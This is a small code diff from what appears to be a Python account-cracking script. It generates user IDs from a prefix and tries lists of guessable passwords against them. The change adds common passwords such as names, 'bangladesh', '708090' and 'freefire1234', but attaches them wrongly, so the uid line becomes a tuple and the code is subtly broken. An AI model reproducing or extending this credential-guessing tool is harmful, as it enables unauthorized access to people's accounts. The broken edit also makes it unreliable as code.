@@ -264,7 +264,7 @@ def xxr():
         print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
         for love in user:
             pwx = [love[1:]]
-            uid = code+love
+            uid = code+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234'
             for Eman in HamiiID:
                 pwx.append(Eman)
                 pwx.append(love)
